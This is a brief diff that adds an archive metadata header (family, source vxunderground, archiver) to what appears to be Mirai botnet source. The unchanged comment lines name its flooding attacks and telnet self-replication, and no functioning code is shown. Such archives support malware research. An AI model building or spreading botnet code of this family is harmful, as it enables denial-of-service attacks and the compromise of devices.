@@ -1,3 +1,14 @@
+/*
+  name      Mirai Family
+  type      linux
+  cve       —
+  year      unknown
+  os        Linux
+  authors   unknown
+  source    vxunderground
+  archived  vxunderground, krisyotam (2026)
+  notes     —
+ */
 // Good STD Attack
 // Telnet Selfrep
 // HTTPHEX Attack
